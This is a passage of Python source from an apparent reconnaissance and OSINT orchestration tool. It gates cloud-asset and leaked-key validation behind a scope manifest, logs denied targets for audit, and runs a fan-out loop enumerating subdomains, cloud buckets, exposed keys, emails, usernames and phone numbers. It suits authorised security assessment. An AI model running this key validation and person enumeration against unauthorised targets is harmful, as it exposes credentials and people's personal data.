    if artifact_summary.processed or artifact_summary.skipped:
        _log(
            "artifact processing",
            (
                f"processed={artifact_summary.processed} "
                f"firebase={artifact_summary.firebase_projects} "
                f"supabase={artifact_summary.supabase_configs} "
                f"skipped={artifact_summary.skipped}"
            ),
        )
    synthesis_summary = synthesis_engine.run()
    _refresh_root_domains(synthesis_summary.root_domains)
    if synthesis_summary.seeds_inserted or synthesis_summary.relations_inserted:
        _log(
            "seed synthesis",
            (
                f"seeds+={synthesis_summary.seeds_inserted} "
                f"relations+={synthesis_summary.relations_inserted} "
                f"corroborated={synthesis_summary.corroborated_count}"
            ),
        )
    finding_summary = finding_engine.run()
    if finding_summary.inserted or finding_summary.updated or finding_summary.removed:
        _log(
            "finding synthesis",
            (
                f"inserted={finding_summary.inserted} "
                f"updated={finding_summary.updated} "
                f"removed={finding_summary.removed} "
                f"active={finding_summary.active_findings}"
            ),
        )

    def _cloud_asset_scope_entries(service: str, ref: str) -> list[dict[str, str]]:
        service_name = str(service or "").strip().lower()
        raw_ref = str(ref or "").strip()
        if not raw_ref:
            return []
        entries: list[dict[str, str]] = []
        seen: set[tuple[str, str]] = set()

        def _append(value: str, seed_type: str) -> None:
            normalized_value = str(value or "").strip()
            normalized_type = str(seed_type or "").strip().lower() or "other"
            key = (normalized_type, normalized_value.casefold())
            if not normalized_value or key in seen:
                return
            seen.add(key)
            entries.append({"value": normalized_value, "seed_type": normalized_type})

        _append(raw_ref, "other")
        parsed = urlparse(raw_ref)
        if parsed.scheme in {"http", "https"} and parsed.netloc:
            _append(raw_ref, "url")
            hostname = str(parsed.hostname or "").strip().lower().strip(".")
            if hostname:
                _append(hostname, "domain")
            return entries

        ref_host = raw_ref.lower().strip(".")
        if "." in ref_host and not re.search(r"\s", ref_host):
            _append(ref_host, "domain")
            _append(f"https://{ref_host}", "url")

        compact_ref = re.sub(r"[^A-Za-z0-9_.-]+", "", raw_ref).strip(".")
        if not compact_ref:
            return entries
        service_alias = {
            "s3": "aws_s3",
            "digitalocean_spaces": "do_spaces",
            "google_cloud_storage": "gcs",
            "azure_blob_storage": "azure_blob",
        }.get(service_name, service_name)
        if service_alias == "firebase":
            for suffix in ("firebaseio.com", "firebaseapp.com", "web.app"):
                _append(f"https://{compact_ref}.{suffix}", "url")
        elif service_alias == "amplify":
            _append(f"https://{compact_ref}.amplifyapp.com", "url")
        elif service_alias == "gcp_appspot":
            _append(f"https://{compact_ref}.appspot.com", "url")
        elif service_alias == "gcp_cloudfunctions":
            if "." in compact_ref:
                _append(f"https://{compact_ref}", "url")
        elif service_alias == "cloudflare_pages":
            _append(
                f"https://{compact_ref}.pages.dev" if "." not in compact_ref else f"https://{compact_ref}",
                "url",
            )
        elif service_alias == "cloudflare_worker":
            if "." in compact_ref:
                _append(f"https://{compact_ref}", "url")
        elif service_alias == "cloudflare_r2":
            if ".r2.dev" in compact_ref or ".r2.cloudflarestorage.com" in compact_ref:
                _append(f"https://{compact_ref}", "url")
        elif service_alias == "github_pages":
            _append(
                f"https://{compact_ref}.github.io" if "." not in compact_ref else f"https://{compact_ref}",
                "url",
            )
        elif service_alias == "gitlab_pages":
            _append(
                f"https://{compact_ref}.gitlab.io" if "." not in compact_ref else f"https://{compact_ref}",
                "url",
            )
        elif service_alias == "supabase":
            _append(f"https://{compact_ref}.supabase.co", "url")
        elif service_alias == "aws_s3":
            _append(f"https://{compact_ref}.s3.amazonaws.com", "url")
            _append(f"https://s3.amazonaws.com/{compact_ref}", "url")
        elif service_alias == "gcs":
            _append(f"https://storage.googleapis.com/{compact_ref}", "url")
            _append(f"https://{compact_ref}.storage.googleapis.com", "url")
        elif service_alias == "azure_blob":
            account = compact_ref.split(".", 1)[0]
            _append(f"https://{account}.blob.core.windows.net", "url")
        elif service_alias == "do_spaces":
            _append(f"https://{compact_ref}.digitaloceanspaces.com", "url")
        elif service_alias == "vercel":
            _append(
                f"https://{compact_ref}.vercel.app" if "." not in compact_ref else f"https://{compact_ref}",
                "url",
            )
        elif service_alias == "netlify":
            _append(
                f"https://{compact_ref}.netlify.app" if "." not in compact_ref else f"https://{compact_ref}",
                "url",
            )
        return entries

    def _cloud_asset_scope_decision(service: str, ref: str) -> dict[str, object]:
        service_name = str(service or "").strip().lower()
        raw_ref = str(ref or "").strip()
        if not raw_ref:
            return {"allowed": False, "reason": "empty", "service": service_name}
        if not (isinstance(scope_manifest_metadata, dict) and scope_manifest_metadata):
            return {
                "allowed": True,
                "reason": "no_scope_manifest",
                "service": service_name,
                "ref": raw_ref,
            }
        entries = _cloud_asset_scope_entries(service_name, raw_ref)
        if not entries:
            return {
                "allowed": False,
                "reason": "scope_manifest_no_candidates",
                "service": service_name,
                "ref": raw_ref,
            }
        scope_result = _validate_scope_manifest_seed_values(scope_manifest_metadata, entries)
        authorized = list(scope_result.get("authorized") or [])
        if authorized:
            first = authorized[0] if isinstance(authorized[0], dict) else {}
            return {
                "allowed": True,
                "reason": "allowed",
                "service": service_name,
                "ref": raw_ref,
                "matched": str(first.get("matched") or first.get("seed_value") or ""),
            }
        return {
            "allowed": False,
            "reason": "scope_manifest_denied",
            "service": service_name,
            "ref": raw_ref,
            "candidate_count": len(entries),
            "scope_manifest_source": str(scope_manifest_metadata.get("source") or ""),
        }

    def _cloud_asset_is_in_scope(service: str, ref: str) -> bool:
        return bool(_cloud_asset_scope_decision(service, ref).get("allowed"))

    def _record_cloud_asset_scope_denied(service: str, ref: str, reason: str) -> None:
        service_name = str(service or "").strip().lower()
        raw_ref = str(ref or "").strip()
        decision = _cloud_asset_scope_decision(service_name, raw_ref)
        decision_reason = str(decision.get("reason") or reason or "scope_manifest_denied")
        _cli_audit(
            db_path,
            engagement_id,
            "scope_gate",
            "cloud_validation",
            "cloud_validation_scope_denied",
            target=f"{service_name}:{raw_ref}",
            result=(
                f"service={service_name} "
                f"ref={raw_ref} "
                f"reason={decision_reason} "
                f"candidates={int(decision.get('candidate_count') or 0)} "
                f"scope_manifest={str(scope_manifest_metadata.get('source') or '') if isinstance(scope_manifest_metadata, dict) else ''}"
            )[:500],
        )
        try:
            from forge.db.migrations import run_migrations as _scope_run_migrations  # noqa: PLC0415
            from forge.db.schema import apply_schema as _scope_apply_schema  # noqa: PLC0415

            con_scope = _sq.connect(db_path)
            try:
                _scope_apply_schema(con_scope)
                _scope_run_migrations(con_scope)
                provider_ref = str(raw_ref or "").strip()
                canonical_ref = provider_ref.lower()
                con_scope.execute(
                    """
                    INSERT INTO cloud_validation_results
                        (engagement_id, asset_type, identifier, provider_identifier, validation_status, validation_method, evidence, notes)
                    VALUES (?, ?, ?, ?, 'UNVERIFIED', 'scope_manifest', 'scope denied before cloud validation', ?)
                    ON CONFLICT(engagement_id, asset_type, identifier) DO UPDATE SET
                        provider_identifier=CASE
                            WHEN cloud_validation_results.provider_identifier IS NULL
                              OR TRIM(cloud_validation_results.provider_identifier) = ''
                              OR cloud_validation_results.provider_identifier = cloud_validation_results.identifier
                            THEN excluded.provider_identifier
                            ELSE cloud_validation_results.provider_identifier
                        END,
                        validation_status='UNVERIFIED',
                        validation_method='scope_manifest',
                        evidence='scope denied before cloud validation',
                        notes=excluded.notes,
                        checked_at=CURRENT_TIMESTAMP
                    """,
                    (engagement_id, service_name, canonical_ref, provider_ref, decision_reason),
                )
                con_scope.commit()
            finally:
                con_scope.close()
        except Exception:  # noqa: BLE001
            pass

    def _key_validation_source_entries(row_payload: dict[str, Any]) -> list[dict[str, str]]:
        entries: list[dict[str, str]] = []
        seen: set[tuple[str, str]] = set()

        def _append(value: str, seed_type: str) -> None:
            normalized_value = str(value or "").strip()
            normalized_type = str(seed_type or "").strip().lower() or "other"
            key = (normalized_type, normalized_value.casefold())
            if not normalized_value or key in seen:
                return
            seen.add(key)
            entries.append({"value": normalized_value, "seed_type": normalized_type})

        def _append_url_or_domain(value: str) -> None:
            raw_value = str(value or "").strip()
            if not raw_value:
                return
            parsed = urlparse(raw_value)
            if parsed.scheme in {"http", "https"} and parsed.netloc:
                _append(raw_value, "url")
                hostname = str(parsed.hostname or "").strip().lower().strip(".")
                if hostname:
                    _append(hostname, "domain")
                return
            candidate = raw_value.lower().strip(".")
            if "." in candidate and not re.search(r"\s", candidate):
                _append(candidate, "domain")
                return
            _append(raw_value, "other")

        _append_url_or_domain(str(row_payload.get("source_url") or ""))
        _append_url_or_domain(str(row_payload.get("domain") or ""))
        repo_name = str(row_payload.get("repo_name") or "").strip()
        if repo_name:
            if repo_name.startswith(("http://", "https://")):
                _append_url_or_domain(repo_name)
            else:
                _append(repo_name, "other")
        return entries

    def _key_validation_scope_decision(row_payload: dict[str, Any]) -> dict[str, object]:
        if not (isinstance(scope_manifest_metadata, dict) and scope_manifest_metadata):
            return {"allowed": True, "reason": "no_scope_manifest"}
        source_url = str(row_payload.get("source_url") or "").strip()
        source_backend = str(row_payload.get("source_backend") or "").strip().lower()
        parsed_source = urlparse(source_url)
        local_artifact_backends = {
            "artifact",
            "artifact_text_extract",
            "mobile_config_parse",
            "local_artifact",
            "local_filesystem",
        }
        if source_backend in local_artifact_backends and parsed_source.scheme not in {"http", "https"}:
            return {
                "allowed": True,
                "reason": "operator_local_artifact",
                "source_backend": source_backend,
            }
        entries = _key_validation_source_entries(row_payload)
        if not entries:
            return {
                "allowed": False,
                "reason": "scope_manifest_no_source_candidates",
                "source_backend": source_backend,
            }
        scope_result = _validate_scope_manifest_seed_values(scope_manifest_metadata, entries)
        authorized = list(scope_result.get("authorized") or [])
        if authorized:
            first = authorized[0] if isinstance(authorized[0], dict) else {}
            return {
                "allowed": True,
                "reason": "allowed",
                "matched": str(first.get("matched") or first.get("seed_value") or ""),
                "source_backend": source_backend,
            }
        return {
            "allowed": False,
            "reason": "scope_manifest_denied",
            "source_backend": source_backend,
            "candidate_count": len(entries),
            "scope_manifest_source": str(scope_manifest_metadata.get("source") or ""),
        }

    def _key_validation_source_is_in_scope(row_payload: dict[str, Any]) -> bool:
        return bool(_key_validation_scope_decision(row_payload).get("allowed"))

    def _record_key_validation_scope_denied(row_payload: dict[str, Any], reason: str) -> None:
        decision = _key_validation_scope_decision(row_payload)
        service_name = str(row_payload.get("service") or "unknown").strip().lower() or "unknown"
        pattern_name = str(row_payload.get("pattern_name") or "").strip()
        key_id = int(row_payload.get("id") or 0)
        source_url = str(row_payload.get("source_url") or "").strip()
        domain_value = str(row_payload.get("domain") or "").strip()
        decision_reason = str(decision.get("reason") or reason or "scope_manifest_denied")
        _cli_audit(
            db_path,
            engagement_id,
            "scope_gate",
            "key_validation",
            "key_validation_scope_denied",
            target=f"{service_name}:{pattern_name}:{key_id}",
            result=(
                f"key_id={key_id} "
                f"service={service_name} "
                f"pattern={pattern_name} "
                f"reason={decision_reason} "
                f"source_url={source_url} "
                f"domain={domain_value} "
                f"candidates={int(decision.get('candidate_count') or 0)} "
                f"scope_manifest={str(scope_manifest_metadata.get('source') or '') if isinstance(scope_manifest_metadata, dict) else ''}"
            )[:500],
        )

    pending_validation_batch_limit = 16

    def _run_pending_cloud_key_validation(pass_label: str) -> None:
        if skip_cloud:
            return
        if dry_run_all:
            _log(pass_label, "[dim]skipped in dry-run mode[/dim]")
            return
        total_attempted = 0
        total_succeeded = 0
        total_failed = 0
        status_counts: dict[str, int] = {}
        batch_number = 0
        while True:
            batch_number += 1
            batch_label = pass_label if batch_number == 1 else f"{pass_label} batch {batch_number}"
            summary = sweep_pending_cloud_validations(
                engagement_id,
                db_path,
                limit=pending_validation_batch_limit,
                max_workers=validation_workers,
                only_unattempted=True,
                progress_label=batch_label,
                progress_callback=_record_validation_progress,
                key_scope_checker=_key_validation_source_is_in_scope,
                key_scope_denied_callback=_record_key_validation_scope_denied,
            )
            attempted = int(summary.get("attempted") or 0)
            if attempted == 0:
                break
            total_attempted += attempted
            total_succeeded += int(summary.get("succeeded") or 0)
            total_failed += int(summary.get("failed") or 0)
            for key, value in (summary.get("status_counts") or {}).items():
                normalized_key = str(key)
                status_counts[normalized_key] = status_counts.get(normalized_key, 0) + int(value or 0)
            if attempted < pending_validation_batch_limit:
                break
        if total_attempted == 0:
            return
        status_text = " ".join(
            f"{str(key).lower()}={value}"
            for key, value in sorted(status_counts.items())
        )
        _log(
            pass_label,
            (
                f"attempted={total_attempted} "
                f"succeeded={total_succeeded} "
                f"failed={total_failed} "
                f"{status_text}".strip()
            ),
        )

    def _run_pending_cloud_asset_validation(pass_label: str) -> None:
        if skip_cloud:
            return
        if dry_run_all:
            _log(pass_label, "[dim]skipped in dry-run mode[/dim]")
            return
        total_attempted = 0
        total_succeeded = 0
        total_failed = 0
        status_counts: dict[str, int] = {}
        batch_number = 0
        while True:
            batch_number += 1
            batch_label = pass_label if batch_number == 1 else f"{pass_label} batch {batch_number}"
            summary = sweep_pending_cloud_asset_validations(
                engagement_id,
                db_path,
                limit=pending_validation_batch_limit,
                max_workers=validation_workers,
                progress_label=batch_label,
                progress_callback=_record_validation_progress,
                scope_checker=_cloud_asset_is_in_scope,
                scope_denied_callback=_record_cloud_asset_scope_denied,
            )
            attempted = int(summary.get("attempted") or 0)
            if attempted == 0:
                break
            total_attempted += attempted
            total_succeeded += int(summary.get("succeeded") or 0)
            total_failed += int(summary.get("failed") or 0)
            for key, value in (summary.get("status_counts") or {}).items():
                normalized_key = str(key)
                status_counts[normalized_key] = status_counts.get(normalized_key, 0) + int(value or 0)
            if attempted < pending_validation_batch_limit:
                break
        if total_attempted == 0:
            return
        status_text = " ".join(
            f"{str(key).lower()}={value}"
            for key, value in sorted(status_counts.items())
        )
        _log(
            pass_label,
            (
                f"attempted={total_attempted} "
                f"succeeded={total_succeeded} "
                f"failed={total_failed} "
                f"{status_text}".strip()
            ),
        )

    def _maybe_interrupt_run(phase: str) -> bool:
        stop_request = _read_stop_request() or _run_control_requested_via_metadata("stop_requested")
        if stop_request is not None:
            requested_by = str(stop_request.get("requested_by") or "unknown")
            reason = str(stop_request.get("reason") or "operator stop requested")
            _cli_audit(
                db_path, engagement_id, "orchestrator", "kill_chain",
                "kill_chain_cancelled", target=domain or seed,
                result=f"phase={phase} requested_by={requested_by} reason={reason[:180]}",
            )
            engagement_run_tracker.finish_run(
                engagement_run_handle,
                status="cancelled",
                current_iteration=last_iteration,
                metadata={
                    **_engagement_run_metadata(phase="cancelled"),
                    "lifecycle_state": "cancelled",
                    "cancel_requested_by": requested_by,
                    "cancel_reason": reason,
                },
            )
            _clear_run_control_markers()
            console.print(
                f"\n[yellow]Kill-chain cancelled[/yellow] during {phase} "
                f"(requested by {requested_by})."
            )
            return True

        pause_request = _read_pause_request() or _run_control_requested_via_metadata("pause_requested")
        if pause_request is None:
            return False
        requested_by = str(pause_request.get("requested_by") or "unknown")
        reason = str(pause_request.get("reason") or "operator pause requested")
        _cli_audit(
            db_path, engagement_id, "orchestrator", "kill_chain",
            "kill_chain_paused", target=domain or seed,
            result=f"phase={phase} requested_by={requested_by} reason={reason[:180]}",
        )
        engagement_run_tracker.finish_run(
            engagement_run_handle,
            status="cancelled",
            current_iteration=last_iteration,
            metadata={
                **_engagement_run_metadata(phase="paused"),
                "lifecycle_state": "paused",
                "pause_requested_by": requested_by,
                "pause_reason": reason,
                "resume_recommended": True,
            },
        )
        _clear_run_control_markers()
        console.print(
            f"\n[yellow]Kill-chain paused[/yellow] during {phase} "
            f"(requested by {requested_by})."
        )
        return True

    _run_pending_cloud_asset_validation("cloud asset validation")
    _run_pending_cloud_key_validation("cloud key validation")
    if _maybe_interrupt_run("preflight"):
        return

    # ═══════════════════════════════════════════════════════════════════
    # SPIDER LOOP — iterate recon fan-out until stable
    # ═══════════════════════════════════════════════════════════════════

    _log("spider", f"starting fan-out loop (max_iterations={max_iterations})")
    all_cloud_refs: dict[str, list[str]] = {
        "supabase": [], "firebase": [], "aws_s3": [], "do_spaces": [], "gcs": [], "azure_blob": [], "amplify": [],
        "gcp_appspot": [], "gcp_cloudfunctions": [],
        "cloudflare_pages": [], "cloudflare_worker": [], "cloudflare_r2": [],
        "github_pages": [], "gitlab_pages": [],
        "vercel": [], "netlify": [],
    }
    all_github_orgs: set[str] = set()  # populated in fan-out D, used in fan-out F
    processed_emails: set[str] = set()          # emails already sent through xposed/holehe/social/sherlock
    processed_github_orgs: set[str] = set()      # GH orgs already keyscanned
    processed_keyscan_targets: set[str] = set()  # domains/orgs already keyscanned
    processed_cloud_refs: set[str] = set()       # cloud service:ref pairs already scanned
    processed_url_seeds: set[str] = set()        # in-scope URL seeds already surface-fetched
    processed_social_handles: set[str] = set()   # social_profiles handles already Sherlocked
    processed_phone_seeds: set[str] = set()      # phone seeds already routed through phone enrichment
    processed_username_seeds: set[str] = set()   # username seeds already routed through username enumeration
    processed_name_seeds: set[str] = set()       # name seeds already routed through name search
    processed_company_seeds: set[str] = set()    # company seeds already routed through public entity search

    def _resume_normalize(value: str) -> str:
        return value.strip().lower()

    def _normalize_username_value(value: str) -> str:
        return value.strip().lower().lstrip("@")

    def _normalize_url_seed_value(value: str) -> str:
        return str(value or "").strip().lower()

    def _url_seed_scope_decision(value: str) -> dict[str, object]:
        raw_value = str(value or "").strip()
        if not raw_value:
            return {"allowed": False, "reason": "empty"}
        parsed = urlparse(raw_value)
        hostname = str(parsed.hostname or "").strip().lower().strip(".")
        if parsed.scheme not in {"http", "https"} or not hostname:
            return {"allowed": False, "reason": "invalid_url"}
        if _excluded_host_for_seed_routing(hostname):
            return {"allowed": False, "reason": "excluded_host", "hostname": hostname}
        if not any(hostname == root or hostname.endswith("." + root) for root in root_domains):
            return {"allowed": False, "reason": "outside_root_domains", "hostname": hostname}
        if _classify_remote_artifact_url(raw_value, "url") is not None:
            return {"allowed": False, "reason": "artifact_url", "hostname": hostname}
        leaf_name = Path(parsed.path or "").name.lower()
        if leaf_name in {"robots.txt", "sitemap.xml"}:
            return {"allowed": False, "reason": "control_file", "hostname": hostname}
        if parsed.path in {"", "/"} and not parsed.query:
            return {"allowed": False, "reason": "root_url", "hostname": hostname}
        if isinstance(scope_manifest_metadata, dict) and scope_manifest_metadata:
            recursive_scope = _validate_scope_manifest_seed_values(
                scope_manifest_metadata,
                [{"value": raw_value, "seed_type": "url"}],
            )
            if recursive_scope.get("denied"):
                return {
                    "allowed": False,
                    "reason": "scope_manifest_denied",
                    "hostname": hostname,
                    "scope_manifest_source": str(scope_manifest_metadata.get("source") or ""),
                }
        return {"allowed": True, "reason": "allowed", "hostname": hostname}

    def _url_seed_is_in_scope(value: str) -> bool:
        return bool(_url_seed_scope_decision(value).get("allowed"))

    def _remote_artifact_url_scope_decision(value: str) -> dict[str, object]:
        raw_value = str(value or "").strip()
        if not raw_value:
            return {"allowed": False, "reason": "empty"}
        parsed = urlparse(raw_value)
        hostname = str(parsed.hostname or "").strip().lower().strip(".")
        if parsed.scheme not in {"http", "https"} or not hostname:
            return {"allowed": False, "reason": "invalid_url"}
        if not (isinstance(scope_manifest_metadata, dict) and scope_manifest_metadata):
            return {"allowed": True, "reason": "no_scope_manifest", "hostname": hostname}
        recursive_scope = _validate_scope_manifest_seed_values(
            scope_manifest_metadata,
            [{"value": raw_value, "seed_type": "url"}],
        )
        if recursive_scope.get("denied"):
            return {
                "allowed": False,
                "reason": "scope_manifest_denied",
                "hostname": hostname,
                "scope_manifest_source": str(scope_manifest_metadata.get("source") or ""),
            }
        return {"allowed": True, "reason": "allowed", "hostname": hostname}

    def _remote_artifact_url_is_in_scope(value: str) -> bool:
        return bool(_remote_artifact_url_scope_decision(value).get("allowed"))

    def _audit_remote_artifact_scope_denied(request: ArtifactDownloadRequest, reason: str) -> None:
        decision = _remote_artifact_url_scope_decision(request.source_url)
        _cli_audit(
            db_path,
            engagement_id,
            "scope_gate",
            "artifact_queue",
            "remote_artifact_scope_denied",
            target=request.source_url,
            result=(
                f"artifact_id={request.artifact_id} "
                f"artifact_type={request.artifact_type} "
                f"reason={str(decision.get('reason') or reason)} "
                f"host={str(decision.get('hostname') or '')} "
                f"scope_manifest={str(scope_manifest_metadata.get('source') or '') if isinstance(scope_manifest_metadata, dict) else ''}"
            )[:500],
        )

    artifact_processor.set_remote_scope_gate(
        _remote_artifact_url_is_in_scope,
        _audit_remote_artifact_scope_denied,
    )

    def _url_seed_should_use_playwright(value: str) -> bool:
        if no_playwright:
            return False
        parsed = urlparse(str(value or "").strip())
        suffix = Path(str(parsed.path or "").strip()).suffix.lower()
        return suffix in {"", ".html", ".htm", ".php", ".asp", ".aspx", ".jsp", ".jspx"}

    def _load_completed_seed_values(
        loop_names: list[str],
        *,
        seed_type: str | None = None,
    ) -> set[str]:
        if not resume_enabled or not loop_names:
            return set()
        placeholders = ",".join("?" for _ in loop_names)
        params: list[object] = [engagement_id, *loop_names]
        sql = (
            "SELECT DISTINCT es.seed_value "
            "FROM seed_runs sr "
            "JOIN engagement_seeds es ON es.id=sr.seed_id "
            "WHERE sr.engagement_id=? "
            f"AND sr.loop_name IN ({placeholders}) "
            "AND sr.status IN ('completed','skipped')"
        )
        if seed_type is not None:
            sql += " AND es.seed_type=?"
            params.append(seed_type)
        con = _sq.connect(f"file:{db_path.as_posix()}?mode=ro", uri=True)
        try:
            try:
                rows = con.execute(sql, tuple(params)).fetchall()
            except _sq.OperationalError:
                return set()
        finally:
            con.close()
        return {
            _resume_normalize(str(row[0] or ""))
            for row in rows
            if str(row[0] or "").strip()
        }

    completed_a_domains = _load_completed_seed_values(["fanout_a_subdomains"], seed_type="domain")
    completed_b_domains = _load_completed_seed_values(["fanout_b_harvest"], seed_type="domain")
    completed_b2_domains = _load_completed_seed_values(["fanout_b2_linkedin"], seed_type="domain")
    completed_d3_domains = _load_completed_seed_values(["fanout_d3_shodan"], seed_type="domain")
    completed_d4_domains = _load_completed_seed_values(["fanout_d4_urlscan"], seed_type="domain")
    completed_dns_domains = _load_completed_seed_values(["fanout_g_dns"], seed_type="domain")
    completed_rdap_domains = _load_completed_seed_values(["fanout_h_rdap"], seed_type="domain")
    completed_wayback_domains = _load_completed_seed_values(["fanout_i_wayback"], seed_type="domain")
    completed_url_seeds = _load_completed_seed_values(["fanout_d5_url_seed_html"], seed_type="url")
    processed_emails = _load_completed_seed_values(["fanout_e_chain"], seed_type="email")
    processed_social_handles = _load_completed_seed_values(["fanout_e5_chain"], seed_type="username")
    processed_keyscan_targets = _load_completed_seed_values(["fanout_f_keyscan"])
    processed_github_orgs = {
        target for target in processed_keyscan_targets
        if "." not in target
    }
    processed_cloud_refs = _load_completed_seed_values(["fanout_j_cloud_scan"], seed_type="other")
    processed_url_seeds = {
        _normalize_url_seed_value(item)
        for item in completed_url_seeds
    }
    completed_username_seeds = _load_completed_seed_values(["fanout_k_seed_username"], seed_type="username")
    completed_phone_seeds = _load_completed_seed_values(["fanout_l_seed_phone"], seed_type="phone")
    completed_ipv4_seeds = _load_completed_seed_values(["fanout_o_seed_ip"], seed_type="ipv4")
    completed_ipv6_seeds = _load_completed_seed_values(["fanout_o_seed_ip"], seed_type="ipv6")
    completed_name_seeds = _load_completed_seed_values(["fanout_m_seed_name"], seed_type="name")
    completed_company_seeds = _load_completed_seed_values(["fanout_n_seed_company"], seed_type="company")
    processed_phone_seeds = set(completed_phone_seeds)
    processed_ip_seeds = set(completed_ipv4_seeds | completed_ipv6_seeds)
    processed_username_seeds = {
        _normalize_username_value(item)
        for item in (
            completed_username_seeds
            | _load_completed_seed_values(["fanout_e_sherlock_localpart"], seed_type="username")
            | _load_completed_seed_values(["fanout_e5_chain"], seed_type="username")
        )
    }
    processed_name_seeds = set(completed_name_seeds)
    processed_company_seeds = set(completed_company_seeds)

    if resume_enabled:
        resume_reused = (
            len(completed_a_domains)
            + len(completed_b_domains)
            + len(processed_emails)
            + len(processed_keyscan_targets)
            + len(processed_cloud_refs)
            + len(completed_url_seeds)
            + len(completed_phone_seeds)
            + len(completed_ipv4_seeds)
            + len(completed_ipv6_seeds)
            + len(completed_username_seeds)
            + len(completed_name_seeds)
            + len(completed_company_seeds)
        )
        if resume_reused:
            _log("resume", f"reusing persisted fan-out state for {resume_reused} seed/loop target(s)")

    _set_progress_counts()
    run_progress_state["phase"] = "preflight"
    engagement_run_tracker.update_run(
        engagement_run_handle,
        current_iteration=0,
        metadata=_engagement_run_metadata(),
    )

    def _safe_social_profile_json_loads(value: str) -> Any:
        try:
            return json.loads(value)
        except Exception:  # noqa: BLE001
            pass
        text = str(value or "").strip()
        if not text.startswith("FORGE-ENC-v"):
            return None
        try:
            from forge.opsec.crypto import decrypt_string  # noqa: PLC0415

            decrypted = decrypt_string(text)
        except Exception:  # noqa: BLE001
            return None
        try:
            return json.loads(decrypted)
        except Exception:  # noqa: BLE001
            return None

    def _extract_social_profile_handles(
        profile_data: Any,
        *,
        row_source: str,
        max_workers: int = 1,
        progress_label: str | None = None,
        progress_callback: Callable[[str, dict[str, object]], None] | None = None,
    ) -> set[str]:
        entries = EngagementSynthesisEngine._social_profile_payload_entries(
            profile_data,
            row_source=row_source,
        )
        entry_progress_label = _derive_child_progress_label(
            progress_label,
            "entry parse",
        )
        extracted_entry_handles = _run_inprocess_batch(
            entries,
            lambda entry: _extract_social_profile_entry_handles(
                entry,
                row_source=row_source,
                max_workers=max_workers if len(entries) == 1 else 1,
                progress_label=_derive_child_progress_label(progress_label, "handle parse"),
                progress_callback=progress_callback,
            ),
            max_workers=max_workers,
            progress_label=entry_progress_label,
            progress_callback=progress_callback,
        )
        found: set[str] = set()
        _run_ordered_inprocess_apply_batch(
            extracted_entry_handles,
            lambda handle_set: found.update(handle_set) if handle_set else None,
            progress_label=_derive_apply_progress_label(entry_progress_label),
            progress_callback=progress_callback,
            order_note="social-profile entry merge order preserved",
        )
        return found

    def _load_new_social_handles(
        already: set[str],
        *,
        max_workers: int = 1,
        progress_label: Optional[str] = None,
        progress_callback: Optional[Callable[[str, dict[str, Any]], None]] = None,
    ) -> set[str]:
        """Extract handles from social_profiles.profile_data that Sherlock
        hasn't processed yet. Discovers usernames surfaced by phone dork
        mining or name search (which insert with source='phone_dork:...'
        or 'name_search:...' respectively)."""
        con = _sq.connect(f"file:{db_path.as_posix()}?mode=ro", uri=True)
        try:
            try:
                rows = con.execute(
                    "SELECT source, profile_data FROM social_profiles "
                    "WHERE engagement_id=? AND profile_data IS NOT NULL",
                    (engagement_id,),
                ).fetchall()
            except _sq.OperationalError:
                return set()
        finally:
            con.close()

        row_items = _collect_social_profile_row_items(
            rows,
            max_workers=max_workers,
            progress_label=_derive_child_progress_label(progress_label, "row prep"),
            progress_callback=progress_callback,
        )
        if not row_items:
            return set()
        if progress_label and len(row_items) > 1 and max_workers > 1:
            _log(
                progress_label,
                f"[dim]parallel parse x{min(max_workers, len(row_items))}[/dim]",
            )
        entry_parse_workers = max_workers if len(row_items) == 1 else 1

        def _extract_row_handles(item: tuple[str, str]) -> set[str]:
            row_source, profile_data = item
            data = _safe_social_profile_json_loads(profile_data)
            if data is None:
                return set()
            return _extract_social_profile_handles(
                data,
                row_source=row_source,
                max_workers=entry_parse_workers,
                progress_label=progress_label,
                progress_callback=progress_callback,
            )

        extracted_handle_sets = _run_inprocess_batch(
            row_items,
            _extract_row_handles,
            max_workers=max_workers,
            progress_label=progress_label,
            progress_callback=progress_callback,
        )
        reduction_progress_label = _derive_reduction_progress_label(progress_label)
        if reduction_progress_label and len(extracted_handle_sets) > 1 and max_workers > 1:
            _log(
                reduction_progress_label,
                f"[dim]parallel parse x{min(max_workers, len(extracted_handle_sets))}[/dim]",
            )
        reduced_handle_sets = _run_inprocess_batch(
            extracted_handle_sets,
            lambda item: _prepare_social_handle_load_reduction_item(item, already=already),
            max_workers=max_workers,
            progress_label=reduction_progress_label,
            progress_callback=progress_callback,
        )
        found: set[str] = set()
        _run_ordered_inprocess_apply_batch(
            reduced_handle_sets,
            lambda handle_set: found.update(handle_set) if handle_set else None,
            progress_label=_derive_apply_progress_label(progress_label),
            progress_callback=progress_callback,
            order_note="social-handle merge order preserved",
        )
        return found

    def _load_new_emails(
        already: set[str],
        *,
        max_workers: int = 1,
        progress_label: str | None = None,
        progress_callback: Callable[[str, dict[str, object]], None] | None = None,
    ) -> set[str]:
        """Return email pivots that have not yet been processed.

        Uses both the legacy ``emails`` table and engagement ``email`` seeds
        so recursive synthesis can feed the E-chain even on partially
        upgraded or pre-existing engagement DBs.
        """
        con = _sq.connect(f"file:{db_path.as_posix()}?mode=ro", uri=True)
        try:
            try:
                email_rows = con.execute(
                    "SELECT DISTINCT email FROM emails WHERE engagement_id=?",
                    (engagement_id,),
                ).fetchall()
            except _sq.OperationalError:
                email_rows = []
            try:
                seed_rows = con.execute(
                    """
                    SELECT DISTINCT seed_value
                    FROM engagement_seeds
                    WHERE engagement_id=?
                      AND seed_type='email'
                      AND COALESCE(status, 'pending') != 'failed'
                    """,
                    (engagement_id,),
                ).fetchall()
            except _sq.OperationalError:
                seed_rows = []
        finally:
            con.close()
        raw_email_values = _collect_text_row_values(
            [*email_rows, *seed_rows],
            max_workers=max_workers,
            progress_label=_derive_child_progress_label(progress_label, "row prep"),
            progress_callback=progress_callback,
        )
        prepared_email_values = _run_inprocess_batch(
            raw_email_values,
            lambda email_value: _prepare_pending_seed_value(
                email_value,
                normalize=_normalize_email_seed_value,
            ),
            max_workers=max_workers,
            progress_label=progress_label,
            progress_callback=progress_callback,
        )
        reduction_progress_label = _derive_reduction_progress_label(progress_label)
        if reduction_progress_label and len(prepared_email_values) > 1 and max_workers > 1:
            _log(
                reduction_progress_label,
                f"[dim]parallel parse x{min(max_workers, len(prepared_email_values))}[/dim]",
            )
        reduced_email_values = _run_inprocess_batch(
            prepared_email_values,
            lambda item: _prepare_email_load_reduction_item(item, already=already),
            max_workers=max_workers,
            progress_label=reduction_progress_label,
            progress_callback=progress_callback,
        )
        loaded_emails: set[str] = set()
